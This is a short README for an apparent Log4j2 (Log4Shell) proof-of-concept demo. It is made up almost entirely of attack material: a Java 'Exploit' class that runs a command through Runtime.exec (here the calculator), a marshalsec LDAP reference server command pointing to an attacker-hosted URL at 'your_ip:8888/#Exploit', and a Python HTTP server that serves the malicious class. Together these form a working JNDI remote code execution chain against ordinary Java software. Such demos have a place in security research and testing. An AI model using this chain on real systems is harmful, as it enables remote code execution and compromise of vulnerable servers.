# log4j2 poc web app demo

## evil code

src at src/main/java/com/example/exploitCode

```java
package com.example.exploitCode;

public class Exploit {
    public Exploit(){
        try{
            // 要执行的命令
            String[] commands = {"calc"};
            Process pc = Runtime.getRuntime().exec(commands);
            pc.waitFor();
        } catch(Exception e){
            e.printStackTrace();
        }
    }

    public static void main(String[] argv) {
        Exploit e = new Exploit();
    }
}
```


## start JNDI server
```shell
java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://your_ip:8888/#Exploit"
```

## start http server
```shell
python -m http.server 8888
```